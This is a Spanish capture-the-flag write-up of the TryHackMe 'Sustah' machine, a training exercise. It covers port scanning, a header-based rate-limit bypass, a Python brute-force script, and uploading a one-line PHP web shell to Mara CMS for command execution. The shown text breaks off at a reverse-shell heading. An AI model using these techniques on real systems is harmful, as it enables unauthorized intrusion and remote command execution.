## TryHackMe  <> Sustah
![image](https://github.com/Esevka/CTF/assets/139042999/0db32652-0c5f-4694-938c-dc2223044a5c)

Enunciado : Responder a una serie de preguntas y  obtener las flags de usuario y root.
---
---

## Escaneo de puertos

-Lanzamos una traza ICMP(ping) para ver si la maquina esta activa, segun el ttl obtenido, por proximidad al valor 64 podriamos decir que es una maquina Linux.

    ┌──(root㉿kali)-[/home/kali/Desktop/ctf/sustah]
    └─# ping -c1 10.10.171.9
    PING 10.10.171.9 (10.10.171.9) 56(84) bytes of data.
    64 bytes from 10.10.171.9: icmp_seq=1 ttl=63 time=93.8 ms
    
    --- 10.10.171.9 ping statistics ---
    1 packets transmitted, 1 received, 0% packet loss, time 0ms
    rtt min/avg/max/mdev = 93.760/93.760/93.760/0.000 ms

-Reporte Nmap (Obtenemos puertos abiertos servicios y versiones que estan corriendo).

    ┌──(root㉿kali)-[/home/…/Desktop/ctf/sustah/nmap]
    └─# nmap -p- --open -sS --min-rate 5000 -n -Pn 10.10.171.9 -vvv -oN open_ports                                                      
    Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-07 10:12 CEST
    Initiating SYN Stealth Scan at 10:12
    PORT     STATE SERVICE REASON
    22/tcp   open  ssh     syn-ack ttl 63
    80/tcp   open  http    syn-ack ttl 63
    8085/tcp open  unknown syn-ack ttl 63
    
                                                                                                                                                                                  
    ┌──(root㉿kali)-[/home/…/Desktop/ctf/sustah/nmap]
    └─# nmap -p 22,80,8085 -sCV 10.10.171.9 -vvv -oN info_ports                   
    Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-07 10:14 CEST
    Scanned at 2023-08-07 10:14:10 CEST for 10s
    
    PORT     STATE SERVICE REASON         VERSION
    22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   2048 bda4a3ae66681d74e1c06aeb2b9bf333 (RSA)
    | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC7zuGtMGKQdFrh6Y8Dgwdo7815klLm7VzG05KNvT112MyF41Vxz+915iRz9nTSQ583i1cmjHp+q+fMq+QGiO0iwIdYN72jop6oFxqyaO2ZjBE3grWHSP2xMsTZc7qXgPu9ZxzVAfc/4mETA8B00yc6XNApJUwfJOYz/qt/pb0WHDVBQLYesg+rrr3UZDrj9L7KNFlW74mT0nzace0yqtcV//dgOMiG8CeS6TRyUG6clbSUdr+yfgPOrcUwhTCMRKv2e30T5naBZ60e1jSuXYmQfmeZtDZ4hdsBWDfOnGnw89O9Ak+VhULGYq/ZxTh31dnWBULftw/l6saLaUJEaVeb
    |   256 9adb73790c72be051a8673dcac6d7aef (ECDSA)
    | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBENNM4XJDFEnfvomDQgg0n7ZF+bHK+/x0EYcjrLP2BGgytEp7yg7A36KajE2QYkQKtHGPamSRLzNWmJpwzaV65w=
    |   256 648d5c79dee1f73f087cebb7b324641f (ED25519)
    |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOd1NxUo0xJ3krpRI1Xm8KMCFXziZngofs/wjOkofKKV
    
    80/tcp   open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
    | http-methods: 
    |_  Supported Methods: GET HEAD POST OPTIONS
    |_http-title: Susta
    |_http-server-header: Apache/2.4.18 (Ubuntu)
    
    8085/tcp open  http    syn-ack ttl 63 Gunicorn 20.0.4
    |_http-title: Spinner
    |_http-server-header: gunicorn/20.0.4
    | http-methods: 
    |_  Supported Methods: HEAD OPTIONS POST GET
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
    

## Analisis de vulnerabilidades en los servicios y explotacion de los mismos.

 -Segun el launchpad obtenido de los servicios OpenSSH y Apache conjunto con el ttl de la traza ICMP, pordriamos decir que estamos delante de una maquina LINUX.

 ![image](https://github.com/Esevka/CTF/assets/139042999/49d7dfd9-eb31-4b51-9b5c-df8ffe9b07b8)

-Puerto 80

  Cargamos la web pero no encontramos nada que nos pueda valer.
  Fuzzeamos con gobuster  pero no encontramos nada.

-Puerto 8085

  Cargamos la web y encontramos una ruleta de la suerte realizada en .js, analizamos su contenido.

  ![image](https://github.com/Esevka/CTF/assets/139042999/d3ffcce9-de04-4075-909f-fd05dc7b251c)

  Supuestamente si metemos el numero correcto nos debe de dar algo, vamos a interceptar la request con Burpsuite y vemos que hace esto.

  Request, mediante el metodo POST envia una variable llamada number=

  ![image](https://github.com/Esevka/CTF/assets/139042999/c5d8ff03-e3d0-4c0a-84ab-4244fbfae3a6)

  Response, como vemos en la imagen las request estan limitadas en tiempo ya que la cabezera de la  respuesta incluye X-RateLimit-Limit.
  
  ![image](https://github.com/Esevka/CTF/assets/139042999/ad9b7652-bb4d-4423-8d41-1bf415509532)

  INFO:
  
    ¿Qué es el Rate Limit?
    El rate limit es el número de llamadas a la API que el usuario o aplicación pueden realizar dentro de un determinado período de tiempo.
    
    RateLimit-Limit: Indica cuántas llamadas tu aplicación puede hacerle a nuestra API por ventana de tiempo. Como ya hemos dicho anteriormente, 
                      nuestra ventana de tiempo es de 1 minuto.
    
    RateLimit-Remaining: Indica el total de solicitudes del cliente disponibles en la ventana de tiempo.
    
    RateLimit-Reset: Indica el tiempo restante para que el límite de solicitudes sea redefinido.


---
Explotamos la aplicacion por fuerza bruta.

1)Nesesitamos bypasear el limite de llamadas a la API.

Info --> https://book.hacktricks.xyz/pentesting-web/rate-limit-bypass

En la cabezera de la request vamos a incluir la siguiente propiedad  (X-Remote-Addr: 127.0.0.1)

        En el caso de "X-Remote-Addr: 127.0.0.1", el encabezado parece indicar la dirección IP del cliente remoto (la computadora o el dispositivo del usuario)
        que realizó la solicitud HTTP al servidor. La dirección IP 127.0.0.1 es una dirección IP especial que apunta a la interfaz de bucle invertido de la máquina local, 
        lo que significa que se refiere a la misma máquina en la que se ejecuta el servidor.

Como vemos hemos podidos saltar el limite, la respuesta ya no incluye en su cabecera los x-limit.

![image](https://github.com/Esevka/CTF/assets/139042999/cc781051-3f59-4c54-b9fe-28b1d30b1efd)

2)Nos vamos a crear un script en python donde vamos a realizar request incluyendo en el encabezado x-Remote y como data le enviamos la variable number con un valor numerico, veremos si damos con el numero correcto.

Contenido del spinner.py, el range del buble for lo aumentaremos en el caso que no este el numero entre 0 y 20000.

    import requests
    
    def spinner(number):
    
            url = 'http://sustah.thm:8085/'
            custom_header = {'X-Remote-Addr':'127.0.0.1'}
            data_number = {'number':'{}'.format(number)}
    
            r = requests.post(url,headers=custom_header,data=data_number)
    
            if 'Spin the wheel and try again' in r.text:
                    print(number)
            else:
                    print(number)
                    print(r.text)
                    exit()
                    
    def main():
            for x in range(0,20000):
                    spinner(x)
    
    if __name__=='__main__':
            main() 

Ejecutamos script y esperamos la gran respuesta.

    ┌──(root㉿kali)-[/home/…/Desktop/ctf/sustah/script]
    └─# python3 spinner.py
    [...]
    10913
    10914
    10915
    [...]
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Spinner</title>
        <link rel="stylesheet" href="/static/style.css">
    </head>
    <body>
      <strong>0</strong>
        <h1>Spinner Wheel</h1>
    [...]
    
        </form>
        <h3>path: /You....P@th</h3>
    </body>
    <script src="/static/index.js"></script>
    
    </html>

Acabamos de obtener el numero correcto y la respuesta que incluye un path  path: /You....P@th

---

Accedemos al path obtenido

Dicho path solo es accesible desde el puerto 80, esta url nos da acceso a MARA CMS

Navegando por lo web si entramos desde el menu Sample Pages ---> Test Page , encontramos una credenciales de acceso

![image](https://github.com/Esevka/CTF/assets/139042999/f83102c7-eb69-4f82-bed4-b65da2d27c0a)

Nos creamos un usuario y nos logueamos con el

![image](https://github.com/Esevka/CTF/assets/139042999/9e18183c-54e2-438b-a008-2781e1138b71)\

![image](https://github.com/Esevka/CTF/assets/139042999/87019269-68ed-49b7-acb4-53cbd77651a4)

Desde el menu File-->new,nos da opcion a subir ficheros al sistema, por lo que vamos a subir un fichero llamado rce.php que nos permitar ejecutar comandos desde la url

    ┌──(root㉿kali)-[/home/…/Desktop/ctf/sustah/script]
    └─# cat rce.php          
    <?php
    system($_GET['cmd']);
    ?>

Una vez subido el fichero el CMS nos muestra un pequeno log indicando que el proceso se ha realizado correctamente y el path donde se ha guardado nuestro fichero.

![image](https://github.com/Esevka/CTF/assets/139042999/c69e56d4-ccc1-4f2f-bc82-e8a85f521f73)

Ejecutamos nuestro rce y vemos que funciona 

![image](https://github.com/Esevka/CTF/assets/139042999/4c49ef16-32a9-49eb-8eac-8e0f4e7795d0)


## Obtenemos Reverse Shell












